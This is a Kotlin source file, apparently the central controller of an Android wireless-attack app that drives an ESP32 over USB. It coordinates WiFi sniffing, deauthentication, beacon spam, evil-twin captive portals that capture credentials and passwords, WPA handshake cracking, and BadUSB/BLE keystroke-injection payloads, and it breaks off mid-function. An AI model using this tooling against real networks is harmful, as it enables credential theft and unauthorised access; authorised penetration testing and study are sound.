package com.swp81x.nrsuite

import android.app.Application
import android.content.Context
import android.content.Intent
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbManager
import android.net.Uri
import android.provider.DocumentsContract
import android.provider.OpenableColumns
import androidx.core.content.ContextCompat
import androidx.documentfile.provider.DocumentFile
import com.swp81x.nrsuite.core.credentials.CapturedCredential
import com.swp81x.nrsuite.core.credentials.CredentialSession
import com.swp81x.nrsuite.core.credentials.CredentialSource
import com.swp81x.nrsuite.core.credentials.CredentialStatus
import com.swp81x.nrsuite.core.credentials.CredentialStore
import com.swp81x.nrsuite.core.eapol.EapolHandshake
import com.swp81x.nrsuite.core.flasher.Esp32Flasher
import com.swp81x.nrsuite.core.flasher.UsbSerialFlasherTransport
import com.swp81x.nrsuite.core.eapol.EapolParser
import com.swp81x.nrsuite.core.history.HistoryLevel
import com.swp81x.nrsuite.core.history.HistoryEntry
import com.swp81x.nrsuite.core.log.LogEntry
import com.swp81x.nrsuite.core.log.LogLevel
import com.swp81x.nrsuite.core.pcap.PcapReader
import com.swp81x.nrsuite.core.pcap.PcapWriter
import com.swp81x.nrsuite.core.session.ConnectionState
import com.swp81x.nrsuite.core.session.NrSession
import com.swp81x.nrsuite.core.wifi.DetectedSsid
import com.swp81x.nrsuite.core.wifi.PcapSsidParser
import com.swp81x.nrsuite.core.wpa.WpaCracker
import com.swp81x.nrsuite.core.wpa.WpaHandshakeVerifier
import com.swp81x.nrsuite.core.wpa.WpaHandshakeParser
import com.swp81x.nrsuite.core.wpa.WpaHandshake
import com.swp81x.nrsuite.core.wpa.EvilTwinResult
import com.swp81x.nrsuite.core.sniff.SniffRequest
import com.swp81x.nrsuite.core.storage.StorageFile
import com.swp81x.nrsuite.core.usb.UsbSerialDevice
import com.swp81x.nrsuite.core.usb.UsbSerialDeviceCatalog
import com.swp81x.nrsuite.core.usb.UsbSerialTransport
import com.swp81x.nrsuite.service.NrSuiteForegroundService
import java.io.File
import java.io.IOException
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject

data class CapturedPassword(
    val value: String,
    val capturedAt: String,
)

/**
 * Application-scoped NRSuite controller.
 *
 * Despite its historical name, this class intentionally does not extend
 * ViewModel. It is owned by [NrSuiteApplication] so the USB bridge, event
 * stream, PCAP collectors, and operation state survive Activity destruction
 * while the foreground service keeps the process alive.
 */
class MainViewModel(internal val app: Application) {
    internal val scope = CoroutineScope(
        SupervisorJob() +
            Dispatchers.Main.immediate +
            CoroutineExceptionHandler { _, error ->
                appendLog(
                    "Unhandled bridge error: ${error.message ?: error.javaClass.simpleName}",
                    level = LogLevel.ERROR,
                )
            },
    )

    internal val usbManager =
        app.getSystemService(Context.USB_SERVICE) as UsbManager
    internal val preferences =
        app.getSharedPreferences(PREFERENCES_NAME, Context.MODE_PRIVATE)

    private val _exportDirectory = MutableStateFlow<Uri?>(null)
    val exportDirectory: StateFlow<Uri?> = _exportDirectory.asStateFlow()

    private val _exportDirectoryName = MutableStateFlow("Not configured")
    val exportDirectoryName: StateFlow<String> = _exportDirectoryName.asStateFlow()

    private val _requiresRootDirectory = MutableStateFlow(false)
    val requiresRootDirectory: StateFlow<Boolean> = _requiresRootDirectory.asStateFlow()

    private val _actionError = MutableStateFlow<String?>(null)
    val actionError: StateFlow<String?> = _actionError.asStateFlow()

    internal val _devices = MutableStateFlow<List<UsbSerialDevice>>(emptyList())
    val devices: StateFlow<List<UsbSerialDevice>> = _devices.asStateFlow()

    internal val _connectionState =
        MutableStateFlow<ConnectionState>(ConnectionState.Disconnected)
    val connectionState: StateFlow<ConnectionState> = _connectionState.asStateFlow()

    private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
    val logs: StateFlow<List<LogEntry>> = _logs.asStateFlow()

    private val _history = MutableStateFlow<List<HistoryEntry>>(emptyList())
    val history: StateFlow<List<HistoryEntry>> = _history.asStateFlow()

    internal val _activeDeviceName = MutableStateFlow<String?>(null)
    val activeDeviceName: StateFlow<String?> = _activeDeviceName.asStateFlow()

    internal val _firmwareFlashUri = MutableStateFlow<Uri?>(null)
    val firmwareFlashUri: StateFlow<Uri?> = _firmwareFlashUri.asStateFlow()

    internal val _firmwareFlashName = MutableStateFlow<String?>(null)
    val firmwareFlashName: StateFlow<String?> = _firmwareFlashName.asStateFlow()

    internal val _firmwareFlashSize = MutableStateFlow(0L)
    val firmwareFlashSize: StateFlow<Long> = _firmwareFlashSize.asStateFlow()

    internal val _firmwareFlashing = MutableStateFlow(false)
    val firmwareFlashing: StateFlow<Boolean> = _firmwareFlashing.asStateFlow()

    internal val _firmwareFlashProgress = MutableStateFlow(0)
    val firmwareFlashProgress: StateFlow<Int> = _firmwareFlashProgress.asStateFlow()

    internal val _firmwareFlashStatus = MutableStateFlow<String?>(null)
    val firmwareFlashStatus: StateFlow<String?> = _firmwareFlashStatus.asStateFlow()

    internal val _firmwareTargetDevice = MutableStateFlow<UsbSerialDevice?>(null)
    val firmwareTargetDevice: StateFlow<UsbSerialDevice?> = _firmwareTargetDevice.asStateFlow()

    private val _recentModuleIds = MutableStateFlow(
        preferences.getString(PREF_RECENT_MODULES, "")
            ?.split(",")
            ?.map { it.trim() }
            ?.filter { it.isNotBlank() }
            ?: emptyList()
    )
    val recentModuleIds: StateFlow<List<String>> = _recentModuleIds.asStateFlow()

    private val _events = MutableStateFlow<List<JSONObject>>(emptyList())
    val events: StateFlow<List<JSONObject>> = _events.asStateFlow()

    private val _networks = MutableStateFlow<List<JSONObject>>(emptyList())
    val networks: StateFlow<List<JSONObject>> = _networks.asStateFlow()

    private val _scanning = MutableStateFlow(false)
    val scanning: StateFlow<Boolean> = _scanning.asStateFlow()

    private val _sniffing = MutableStateFlow(false)
    val sniffing: StateFlow<Boolean> = _sniffing.asStateFlow()

    private val _sniffPacketCount = MutableStateFlow(0L)
    val sniffPacketCount: StateFlow<Long> = _sniffPacketCount.asStateFlow()

    private val _sniffHandshake = MutableStateFlow(EapolHandshake())
    val sniffHandshake: StateFlow<EapolHandshake> = _sniffHandshake.asStateFlow()

    private val _capturePath = MutableStateFlow<String?>(null)
    val capturePath: StateFlow<String?> = _capturePath.asStateFlow()

    private val _beaconRunning = MutableStateFlow(false)
    val beaconRunning: StateFlow<Boolean> = _beaconRunning.asStateFlow()

    private val _beaconSent = MutableStateFlow(0)
    val beaconSent: StateFlow<Int> = _beaconSent.asStateFlow()

    private val _beaconSsidCount = MutableStateFlow(0)
    val beaconSsidCount: StateFlow<Int> = _beaconSsidCount.asStateFlow()

    private val _beaconChannel = MutableStateFlow(0)
    val beaconChannel: StateFlow<Int> = _beaconChannel.asStateFlow()

    private val _beaconListMap = MutableStateFlow<Map<String, List<String>>>(emptyMap())
    val beaconListMap: StateFlow<Map<String, List<String>>> = _beaconListMap.asStateFlow()

    private var beaconStatusJob: Job? = null

    private val _deauthRunning = MutableStateFlow(false)
    val deauthRunning: StateFlow<Boolean> = _deauthRunning.asStateFlow()

    private val _deauthSent = MutableStateFlow(0)
    val deauthSent: StateFlow<Int> = _deauthSent.asStateFlow()

    private val _deauthTarget = MutableStateFlow("")
    val deauthTarget: StateFlow<String> = _deauthTarget.asStateFlow()

    private val _deauthChannel = MutableStateFlow(0)
    val deauthChannel: StateFlow<Int> = _deauthChannel.asStateFlow()

    private val _portalRunning = MutableStateFlow(false)
    val portalRunning: StateFlow<Boolean> = _portalRunning.asStateFlow()

    private val _portalHtmlSize = MutableStateFlow(0)
    val portalHtmlSize: StateFlow<Int> = _portalHtmlSize.asStateFlow()

    private val _portalHtmlComplete = MutableStateFlow(false)
    val portalHtmlComplete: StateFlow<Boolean> = _portalHtmlComplete.asStateFlow()

    private val _portalHtmlUploading = MutableStateFlow(false)
    val portalHtmlUploading: StateFlow<Boolean> = _portalHtmlUploading.asStateFlow()

    private val _portalHtmlUploadProgress = MutableStateFlow(0)
    val portalHtmlUploadProgress: StateFlow<Int> = _portalHtmlUploadProgress.asStateFlow()

    private val _evilTwinHtmlUploading = MutableStateFlow(false)
    val evilTwinHtmlUploading: StateFlow<Boolean> = _evilTwinHtmlUploading.asStateFlow()

    private val _evilTwinHtmlUploadProgress = MutableStateFlow(0)
    val evilTwinHtmlUploadProgress: StateFlow<Int> = _evilTwinHtmlUploadProgress.asStateFlow()

    private val _evilTwinHtmlComplete = MutableStateFlow(false)
    val evilTwinHtmlComplete: StateFlow<Boolean> = _evilTwinHtmlComplete.asStateFlow()

    private val _portalSsid = MutableStateFlow("")
    val portalSsid: StateFlow<String> = _portalSsid.asStateFlow()

    private val _portalChannel = MutableStateFlow(0)
    val portalChannel: StateFlow<Int> = _portalChannel.asStateFlow()

    private val _portalViews = MutableStateFlow(0)
    val portalViews: StateFlow<Int> = _portalViews.asStateFlow()

    private val _portalClients = MutableStateFlow(0)
    val portalClients: StateFlow<Int> = _portalClients.asStateFlow()

    private val _portalCapturedData = MutableStateFlow(0)
    val portalCapturedData: StateFlow<Int> = _portalCapturedData.asStateFlow()

    private val _portalCredentials = MutableStateFlow<List<CapturedCredential>>(emptyList())
    val portalCredentials: StateFlow<List<CapturedCredential>> = _portalCredentials.asStateFlow()

    private val _portalHtmlUri = MutableStateFlow<Uri?>(null)
    val portalHtmlUri: StateFlow<Uri?> = _portalHtmlUri.asStateFlow()

    private val _portalHtmlName = MutableStateFlow<String?>(null)
    val portalHtmlName: StateFlow<String?> = _portalHtmlName.asStateFlow()

    private val _portalMode = MutableStateFlow<String?>(null)
    val portalMode: StateFlow<String?> = _portalMode.asStateFlow()

    private val _portalEventLog = MutableStateFlow<List<String>>(emptyList())
    val portalEventLog: StateFlow<List<String>> = _portalEventLog.asStateFlow()

    private val _evilTwinEventLog = MutableStateFlow<List<String>>(emptyList())
    val evilTwinEventLog: StateFlow<List<String>> = _evilTwinEventLog.asStateFlow()

    private val _evilTwinHtmlUri = MutableStateFlow<Uri?>(null)
    private val _evilTwinHtmlName = MutableStateFlow<String?>(null)
    val evilTwinHtmlName: StateFlow<String?> = _evilTwinHtmlName.asStateFlow()

    private val _portalHandshake = MutableStateFlow(EapolHandshake())
    val portalHandshake: StateFlow<EapolHandshake> = _portalHandshake.asStateFlow()

    private val _evilTwinPasswords = MutableStateFlow<List<CapturedPassword>>(emptyList())
    val evilTwinPasswords: StateFlow<List<CapturedPassword>> = _evilTwinPasswords.asStateFlow()

    private val _portalWpaHandshake = MutableStateFlow(WpaHandshake())
    val portalWpaHandshake: StateFlow<WpaHandshake> = _portalWpaHandshake.asStateFlow()

    private val _evilTwinResults = MutableStateFlow<List<EvilTwinResult>>(emptyList())
    val evilTwinResults: StateFlow<List<EvilTwinResult>> = _evilTwinResults.asStateFlow()

    private val credentialStore = CredentialStore(File(app.filesDir, "Credentials"))
    private val _credentialSessions = MutableStateFlow<List<CredentialSession>>(emptyList())
    val credentialSessions: StateFlow<List<CredentialSession>> = _credentialSessions.asStateFlow()
    private val credentialLock = Any()
    private var activeCredentialSession: CredentialSession? = null
    private var evilTwinAutoStopIssued = false
    private var activePortalTargetBssid: String = ""

    private val _crackerSelectedSession = MutableStateFlow<CredentialSession?>(null)
    val crackerSelectedSession: StateFlow<CredentialSession?> = _crackerSelectedSession.asStateFlow()

    private val _crackerWordlistUri = MutableStateFlow<Uri?>(null)
    val crackerWordlistUri: StateFlow<Uri?> = _crackerWordlistUri.asStateFlow()

    private val _crackerWordlistName = MutableStateFlow<String?>(null)
    val crackerWordlistName: StateFlow<String?> = _crackerWordlistName.asStateFlow()

    private val _crackerRunning = MutableStateFlow(false)
    val crackerRunning: StateFlow<Boolean> = _crackerRunning.asStateFlow()

    private val _crackerTested = MutableStateFlow(0L)
    val crackerTested: StateFlow<Long> = _crackerTested.asStateFlow()

    private val _crackerSpeed = MutableStateFlow(0.0)
    val crackerSpeed: StateFlow<Double> = _crackerSpeed.asStateFlow()

    private val _crackerResult = MutableStateFlow<String?>(null)
    val crackerResult: StateFlow<String?> = _crackerResult.asStateFlow()

    private val _crackerStatus = MutableStateFlow("Select a saved handshake and a wordlist.")
    val crackerStatus: StateFlow<String> = _crackerStatus.asStateFlow()

    private val _crackerCustomPcapUri = MutableStateFlow<Uri?>(null)
    val crackerCustomPcapUri: StateFlow<Uri?> = _crackerCustomPcapUri.asStateFlow()

    private val _crackerCustomPcapName = MutableStateFlow<String?>(null)
    val crackerCustomPcapName: StateFlow<String?> = _crackerCustomPcapName.asStateFlow()

    private val _crackerCustomSsid = MutableStateFlow("")
    val crackerCustomSsid: StateFlow<String> = _crackerCustomSsid.asStateFlow()

    private val _crackerCustomPcapValid = MutableStateFlow(false)
    val crackerCustomPcapValid: StateFlow<Boolean> = _crackerCustomPcapValid.asStateFlow()

    private val _crackerCustomPcapValidating = MutableStateFlow(false)
    val crackerCustomPcapValidating: StateFlow<Boolean> = _crackerCustomPcapValidating.asStateFlow()

    private val _crackerCustomPcapMessage = MutableStateFlow("No custom PCAP selected.")
    val crackerCustomPcapMessage: StateFlow<String> = _crackerCustomPcapMessage.asStateFlow()

    private val _crackerCustomSsidOptions = MutableStateFlow<List<DetectedSsid>>(emptyList())
    val crackerCustomSsidOptions: StateFlow<List<DetectedSsid>> = _crackerCustomSsidOptions.asStateFlow()

    private val _crackerCustomSsidSelected = MutableStateFlow<String?>(null)
    val crackerCustomSsidSelected: StateFlow<String?> = _crackerCustomSsidSelected.asStateFlow()

    private val _crackerCustomSsidManual = MutableStateFlow(true)
    val crackerCustomSsidManual: StateFlow<Boolean> = _crackerCustomSsidManual.asStateFlow()

    private var crackerJob: Job? = null

    private val _evilTwinCapturePath = MutableStateFlow<String?>(null)
    val evilTwinCapturePath: StateFlow<String?> = _evilTwinCapturePath.asStateFlow()

    private var portalPcapJob: Job? = null
    private var portalPcapWriter: PcapWriter? = null
    private var portalPcapFile: File? = null
    private val exportedCapturePaths = mutableSetOf<String>()

    private var portalStatusJob: Job? = null

    internal val _storageFiles = MutableStateFlow<List<StorageFile>>(emptyList())
    val storageFiles: StateFlow<List<StorageFile>> = _storageFiles.asStateFlow()

    internal val _storageTotal = MutableStateFlow(0L)
    val storageTotal: StateFlow<Long> = _storageTotal.asStateFlow()

    internal val _storageUsed = MutableStateFlow(0L)
    val storageUsed: StateFlow<Long> = _storageUsed.asStateFlow()

    internal val _storageFree = MutableStateFlow(0L)
    val storageFree: StateFlow<Long> = _storageFree.asStateFlow()

    internal val _storageLoading = MutableStateFlow(false)
    val storageLoading: StateFlow<Boolean> = _storageLoading.asStateFlow()

    internal val _badUsbPayloadUri = MutableStateFlow<Uri?>(null)
    val badUsbPayloadUri: StateFlow<Uri?> = _badUsbPayloadUri.asStateFlow()

    internal val _badUsbPayloadName = MutableStateFlow<String?>(null)
    val badUsbPayloadName: StateFlow<String?> = _badUsbPayloadName.asStateFlow()

    internal val _badUsbSavedScriptText = MutableStateFlow<String?>(null)

    internal val _bleSavedScriptText = MutableStateFlow<String?>(null)

    internal val _duckyScriptMap = MutableStateFlow<Map<String, String>>(emptyMap())
    val duckyScriptMap: StateFlow<Map<String, String>> = _duckyScriptMap.asStateFlow()

    internal val _badUsbUploading = MutableStateFlow(false)
    val badUsbUploading: StateFlow<Boolean> = _badUsbUploading.asStateFlow()

    internal val _badUsbProgress = MutableStateFlow(0)
    val badUsbProgress: StateFlow<Int> = _badUsbProgress.asStateFlow()

    internal val _bleAdvertising = MutableStateFlow(false)
    val bleAdvertising: StateFlow<Boolean> = _bleAdvertising.asStateFlow()

    internal val _bleConnected = MutableStateFlow(false)
    val bleConnected: StateFlow<Boolean> = _bleConnected.asStateFlow()

    internal val _blePeer = MutableStateFlow("")
    val blePeer: StateFlow<String> = _blePeer.asStateFlow()

    internal val _blePayloadUri = MutableStateFlow<Uri?>(null)
    val blePayloadUri: StateFlow<Uri?> = _blePayloadUri.asStateFlow()

    internal val _blePayloadName = MutableStateFlow<String?>(null)
    val blePayloadName: StateFlow<String?> = _blePayloadName.asStateFlow()

    internal val _bleModifiers = MutableStateFlow<Set<String>>(emptySet())
    val bleModifiers: StateFlow<Set<String>> = _bleModifiers.asStateFlow()

    internal val _bleModifierHold = MutableStateFlow(false)
    val bleModifierHold: StateFlow<Boolean> = _bleModifierHold.asStateFlow()

    internal val _bleScriptRunning = MutableStateFlow(false)
    val bleScriptRunning: StateFlow<Boolean> = _bleScriptRunning.asStateFlow()

    internal val bleTypeBuffer = StringBuilder()
    internal var bleTypeJob: Job? = null

    internal var bleStatusJob: Job? = null

    internal var session: NrSession? = null
    internal var activeSerialDevice: UsbSerialDevice? = null
    internal var activeDeviceFingerprint: String? = null
    internal var sessionObservers: List<Job> = emptyList()
    private var pcapWriter: PcapWriter? = null
    private var pcapJob: Job? = null

    init {
        loadExportDirectory()
        loadBeaconLists()
        this.loadDuckyScriptsImpl()
        loadHistory()
        loadCredentialSessions()
        refreshDevices()
    }

    fun onModuleOpened(moduleId: String) {
        val current = _recentModuleIds.value.toMutableList()
        current.remove(moduleId)
        current.add(0, moduleId)
        val trimmed = current.take(3)
        _recentModuleIds.value = trimmed
        preferences.edit().putString(PREF_RECENT_MODULES, trimmed.joinToString(",")).apply()
    }

    fun saveBeaconList(name: String, ssids: List<String>) {
        val cleanName = name.trim()
        if (cleanName.isBlank()) return
        val cleanSsids = ssids.map { it.trim() }.filter { it.isNotEmpty() }.distinct()
        _beaconListMap.update { it + (cleanName to cleanSsids) }
        persistBeaconLists()
        appendLog("Saved beacon SSID list '$cleanName' (${cleanSsids.size} SSIDs).")
    }

    fun deleteBeaconList(name: String) {
        _beaconListMap.update { it - name }
        persistBeaconLists()
        appendLog("Deleted beacon SSID list '$name'.")
    }

    private fun loadBeaconLists() {
        val raw = preferences.getString(PREF_BEACON_LISTS, null) ?: return
        runCatching {
            val json = JSONObject(raw)
            val map = mutableMapOf<String, List<String>>()
            json.keys().forEach { key ->
                val array = json.optJSONArray(key) ?: return@forEach
                val list = mutableListOf<String>()
                for (i in 0 until array.length()) {
                    val value = array.optString(i)
                    if (value.isNotBlank()) list += value
                }
                map[key] = list
            }
            _beaconListMap.value = map
        }
    }

    private fun persistBeaconLists() {
        val json = JSONObject()
        _beaconListMap.value.forEach { (name, ssids) ->
            val array = org.json.JSONArray()
            ssids.forEach { array.put(it) }
            json.put(name, array)
        }
        preferences.edit().putString(PREF_BEACON_LISTS, json.toString()).apply()
    }

    fun onRootDirectoryPromptShown() {
        _requiresRootDirectory.value = false
    }

    fun setExportDirectory(uri: Uri) {
        val resolver = app.contentResolver
        val flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
        runCatching { resolver.takePersistableUriPermission(uri, flags) }
        _exportDirectory.value = uri
        preferences.edit().putString(PREF_EXPORT_DIRECTORY, uri.toString()).apply()
        _exportDirectoryName.value = displayNameForTreeUri(uri)
        appendLog("Capture export folder: ${_exportDirectoryName.value}")
        ensureRootStructure(uri)
    }

    private fun loadExportDirectory() {
        val stored = preferences.getString(PREF_EXPORT_DIRECTORY, null) ?: return
        val uri = runCatching { Uri.parse(stored) }.getOrNull() ?: return
        _exportDirectory.value = uri
        _exportDirectoryName.value = displayNameForTreeUri(uri)
        ensureRootStructure(uri)
    }

    fun refreshDevices() = this.refreshDevicesImpl()

    fun clearLogs() {
        _logs.value = emptyList()
    }

    fun clearHistory() {
        _history.value = emptyList()
        persistHistory()
    }

    fun addHistory(module: String, summary: String, level: HistoryLevel = HistoryLevel.INFO) {
        val entry = HistoryEntry(
            id = System.currentTimeMillis(),
            timestamp = java.time.LocalTime.now()
                .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss")),
            module = module,
            summary = summary,
            level = level,
        )
        _history.update { (listOf(entry) + it).take(300) }
        persistHistory()
    }

    private fun loadHistory() {
        val raw = preferences.getString(PREF_HISTORY, null) ?: return
        runCatching {
            val array = org.json.JSONArray(raw)
            val entries = mutableListOf<HistoryEntry>()
            for (i in 0 until array.length()) {
                val obj = array.optJSONObject(i) ?: continue
                entries += HistoryEntry(
                    id = obj.optLong("id"),
                    timestamp = obj.optString("timestamp"),
                    module = obj.optString("module"),
                    summary = obj.optString("summary"),
                    level = runCatching {
                        HistoryLevel.valueOf(obj.optString("level"))
                    }.getOrDefault(HistoryLevel.INFO),
                )
            }
            _history.value = entries
        }
    }

    private fun persistHistory() {
        val array = org.json.JSONArray()
        _history.value.forEach { entry ->
            array.put(org.json.JSONObject().apply {
                put("id", entry.id)
                put("timestamp", entry.timestamp)
                put("module", entry.module)
                put("summary", entry.summary)
                put("level", entry.level.name)
            })
        }
        preferences.edit().putString(PREF_HISTORY, array.toString()).apply()
    }

    fun onUsbDeviceAttached() = this.onUsbDeviceAttachedImpl()


    fun onUsbDeviceDetached(device: UsbDevice) = this.onUsbDeviceDetachedImpl(device)

    fun hasPermission(device: UsbDevice): Boolean = this.hasPermissionImpl(device)

    fun onPermissionResult(device: UsbDevice, granted: Boolean) = this.onPermissionResultImpl(device, granted)

    fun connect(device: UsbDevice) = this.connectImpl(device)

    fun scanWifi() {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before scanning.")
            return
        }
        if (_scanning.value) return
        if (!ensureRadioIdle("WiFi Scan")) return

        _networks.value = emptyList()
        _scanning.value = true
        scope.launch {
            appendLog("Starting WiFi scan...")
            val count = activeSession.scanWifi()
            _scanning.value = false
            when {
                count == null -> appendLog("WiFi scan timed out.")
                count < 0 -> appendLog("WiFi scan failed.")
                else -> {
                    appendLog("WiFi scan complete: $count network(s).")
                    addHistory("scan", "WiFi scan complete: $count network(s)", HistoryLevel.SUCCESS)
                }
            }
        }
    }

    fun setBadUsbPayload(uri: Uri, name: String?) = this.setBadUsbPayloadImpl(uri, name)

    fun clearBadUsbPayload() = this.clearBadUsbPayloadImpl()

    fun saveDuckyScript(name: String, script: String) = this.saveDuckyScriptImpl(name, script)

    fun deleteDuckyScript(name: String) = this.deleteDuckyScriptImpl(name)

    fun useBadUsbSavedScript(name: String) = this.useBadUsbSavedScriptImpl(name)

    fun useBleSavedScript(name: String) = this.useBleSavedScriptImpl(name)



    fun armBadUsb(mscMode: Boolean) = this.armBadUsbImpl(mscMode)

    fun refreshStorage() = this.refreshStorageImpl()

    fun deleteStorageFile(name: String) = this.deleteStorageFileImpl(name)

    fun startMassStorage() = this.startMassStorageImpl()

    fun setEvilTwinHtmlFile(uri: Uri, name: String?) {
        _evilTwinHtmlUri.value = uri
        _evilTwinHtmlName.value = name ?: uri.lastPathSegment ?: "evil_twin.html"
        _evilTwinHtmlUploading.value = false
        _evilTwinHtmlUploadProgress.value = 0
        _evilTwinHtmlComplete.value = false
        appendLog("Evil Twin HTML selected: ${_evilTwinHtmlName.value}")
    }

    fun clearEvilTwinHtmlFile() {
        _evilTwinHtmlUri.value = null
        _evilTwinHtmlName.value = null
        _evilTwinHtmlUploading.value = false
        _evilTwinHtmlUploadProgress.value = 0
        _evilTwinHtmlComplete.value = false
        appendLog("Evil Twin HTML cleared.")
    }

    fun setFirmwareFlashFile(uri: Uri, name: String?) = this.setFirmwareFlashFileImpl(uri, name)


    fun clearFirmwareFlashFile() = this.clearFirmwareFlashFileImpl()

    fun selectFirmwareTarget(device: UsbDevice) = this.selectFirmwareTargetImpl(device)

    fun startFirmwareFlash(targetChip: String, skipReset: Boolean) = this.startFirmwareFlashImpl(targetChip, skipReset)

    internal fun stopActiveOperations() {
        finishActiveCredentialSession()
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        portalStatusJob?.cancel()
        portalStatusJob = null
        portalPcapJob?.cancel()
        portalPcapJob = null
        pcapJob?.cancel()
        pcapJob = null
        bleStatusJob?.cancel()
        bleStatusJob = null

        _beaconRunning.value = false
        _portalRunning.value = false
        _sniffing.value = false
        _deauthRunning.value = false
        _bleAdvertising.value = false
        _bleConnected.value = false
        _bleScriptRunning.value = false
        this.clearBleRealtimeStateImpl()
        _portalMode.value = null

        val captureToExport = portalPcapFile
        runCatching { portalPcapWriter?.close() }
        portalPcapWriter = null
        portalPcapFile = null
        exportPcapToRootIfConfigured(captureToExport)
        runCatching { pcapWriter?.close() }
        pcapWriter = null
        _evilTwinCapturePath.value = null
        updateForegroundService()
    }

    fun setPortalHtmlFile(uri: Uri, name: String?) {
        _portalHtmlUri.value = uri
        _portalHtmlName.value = name ?: uri.lastPathSegment ?: "HTML file"
        _portalHtmlUploading.value = false
        _portalHtmlUploadProgress.value = 0
        _portalHtmlComplete.value = false
        appendLog("Portal HTML selected: ${_portalHtmlName.value}")
    }

    fun clearPortalHtmlFile() {
        _portalHtmlUri.value = null
        _portalHtmlName.value = null
        _portalHtmlUploading.value = false
        _portalHtmlUploadProgress.value = 0
        _portalHtmlComplete.value = false
        appendLog("Portal HTML cleared; device will use its placeholder page.")
    }

    fun startPortal(ssid: String, channel: Int, targetBssid: String) {
        startPortalInternal(ssid, channel, targetBssid, _portalHtmlUri.value, "portal")
    }

    fun startEvilTwin(ssid: String, channel: Int, targetBssid: String) {
        if (_evilTwinHtmlUri.value == null) {
            appendLog("Select a custom HTML file before starting Evil Twin.", level = LogLevel.ERROR)
            return
        }
        startPortalInternal(ssid, channel, targetBssid, _evilTwinHtmlUri.value, "evil_twin")
    }

    private fun startPortalInternal(
        ssid: String,
        channel: Int,
        targetBssid: String,
        htmlUri: Uri?,
        mode: String,
    ) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before starting the portal.")
            return
        }
        if (_portalRunning.value) return
        if (!ensureRadioIdle(if (mode == "evil_twin") "Evil Twin" else "Captive Portal")) return
        _portalMode.value = mode

        val cleanSsid = ssid.trim().ifBlank { "Free WiFi" }
        val cleanBssid = targetBssid.trim().uppercase()
        if (cleanBssid.isNotBlank() && !MAC_PATTERN.matches(cleanBssid)) {
            appendLog("Invalid target BSSID: $cleanBssid")
            return
        }

        // Firmware radioIdle() stops other radio tasks when the portal starts.
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        if (_sniffing.value) {
            _sniffing.value = false
            pcapJob?.cancel()
            pcapJob = null
            scope.launch(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
                pcapWriter = null
            }
        }

        _portalSsid.value = cleanSsid
        _portalChannel.value = channel.coerceIn(1, 13)
        _portalViews.value = 0
        _portalClients.value = 0
        _portalCapturedData.value = 0
        _portalCredentials.value = emptyList()

        scope.launch {
            val args = JSONObject().apply {
                put("ssid", cleanSsid)
                put("channel", channel.coerceIn(1, 13))
                put("bssid", cleanBssid.ifBlank { "" })
            }
            appendLog("Starting captive portal '$cleanSsid' on channel ${channel.coerceIn(1, 13)}...")
            val response = activeSession.sendCommand("START_PORTAL", args, timeoutMs = 15_000)
            if (response?.optBoolean("ok") != true) {
                appendLog("Failed to start portal: ${response?.optString("msg") ?: "timeout"}")
                return@launch
            }

            _portalRunning.value = true
            updateForegroundService()
            _portalHtmlSize.value = 0
            if (mode == "evil_twin") {
                _evilTwinHtmlUploading.value = false
                _evilTwinHtmlUploadProgress.value = 0
            } else {
                _portalHtmlUploading.value = false
                _portalHtmlUploadProgress.value = 0
            }
            _portalHandshake.value = EapolHandshake()
            _portalWpaHandshake.value = WpaHandshake()

            activePortalTargetBssid = cleanBssid
            if (mode == "evil_twin") {
                _evilTwinPasswords.value = emptyList()
                _evilTwinResults.value = emptyList()
                _evilTwinEventLog.value = emptyList()
            }
            synchronized(credentialLock) {
                activeCredentialSession = CredentialSession(
                    id = System.currentTimeMillis().toString(),
                    source = if (mode == "evil_twin") {
                        CredentialSource.EVIL_TWIN
                    } else {
                        CredentialSource.PORTAL
                    },
                    ssid = cleanSsid,
                    bssid = cleanBssid,
                    channel = channel.coerceIn(1, 13),
                    startedAt = timestampNow(),
                    endedAt = null,
                    pcapPath = null,
                    credentials = emptyList(),
                )
                evilTwinAutoStopIssued = false
            }

            if (cleanBssid.isNotBlank()) {
                portalPcapJob?.cancel()
                runCatching { portalPcapWriter?.close() }
                portalPcapWriter = null
                portalPcapFile = null
                _evilTwinCapturePath.value = null

                val captureDir = File(app.filesDir, "EvilTwin")
                if (captureDir.exists() || captureDir.mkdirs()) {
                    val macName = cleanBssid.replace(":", "").uppercase()
                    val captureFile = File(captureDir, "${macName}_eviltwin_${System.currentTimeMillis()}.pcap")
                    portalPcapWriter = runCatching { PcapWriter(captureFile) }.getOrNull()
                    portalPcapFile = captureFile
                    _evilTwinCapturePath.value = captureFile.absolutePath
                    synchronized(credentialLock) {
                        activeCredentialSession = activeCredentialSession?.copy(
                            pcapPath = captureFile.absolutePath,
                        )
                    }
                    if (portalPcapWriter != null) {
                        appendLog("Evil Twin capture: ${captureFile.absolutePath}")
                    } else {
                        appendLog("Could not create Evil Twin PCAP capture file.")
                    }
                }

                val captureHandshake = EapolHandshake()
                val wpaHandshake = WpaHandshake()
                var handshakeWasComplete = false
                portalPcapJob = scope.launch(Dispatchers.IO) {
                    try {
                        activeSession.pcap.collect { frame ->
                            runCatching {
                                portalPcapWriter?.writePacket(frame)
                                EapolParser.parse(frame, captureHandshake)
                                _portalHandshake.value = captureHandshake.copy()
                                WpaHandshakeParser.parse(frame, wpaHandshake)
                                _portalWpaHandshake.value = wpaHandshake.copyHandshake()

                                val completeNow = wpaHandshake.isComplete
